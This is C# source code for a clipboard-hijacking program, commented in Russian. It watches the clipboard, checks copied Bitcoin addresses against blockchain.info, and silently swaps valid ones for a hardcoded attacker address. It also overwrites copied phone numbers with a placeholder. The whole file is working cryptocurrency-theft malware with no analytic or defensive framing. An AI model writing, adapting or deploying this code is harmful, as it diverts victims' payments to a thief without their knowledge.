using System.Net;
using System.IO;
using System.Text.RegularExpressions;
using System.Windows.Forms;
using ClipboardHelper;

namespace Clip
{
    class Program
    {
        static void Main(string[] args)
        {
            ClipboardMonitor.OnClipboardChange += Clip;
            ClipboardMonitor.Start();
        }
        
        static void Clip(ClipboardFormat sormat, object data)
        {
            Regex myReg1 = new Regex(@"((\+38|8)[ ]?)?([(]?\d{3}[)]?[\- ]?)?[\d\-]{6,14}"); //номер телефона
            Regex myReg2 = new Regex(@"^(?=.*[0-9])(?=.*[a-zA-Z])[\da-zA-Z]{27,34}$"); //биткоин

            string bufertext = Clipboard.GetText();

            if (myReg1.IsMatch(bufertext))
                Clipboard.SetText("Номер телефона");
            else if (myReg2.IsMatch(bufertext) && GET("https://blockchain.info/ru/q/addresstohash/",bufertext) != "0")
                Clipboard.SetText("16JpwbFNzQGAbfJPJgR7MNs9EPTfbK5bsh");

        }

        static string GET(string URL, string param)
        {
            try
            {
                WebRequest req = WebRequest.Create(URL + param);
                WebResponse resp = req.GetResponse();
                Stream stream = resp.GetResponseStream();
                StreamReader sr = new StreamReader(stream);
                string OUT = sr.ReadToEnd();
                return OUT;
            }
            catch { return "0"; }
        }
    }
}
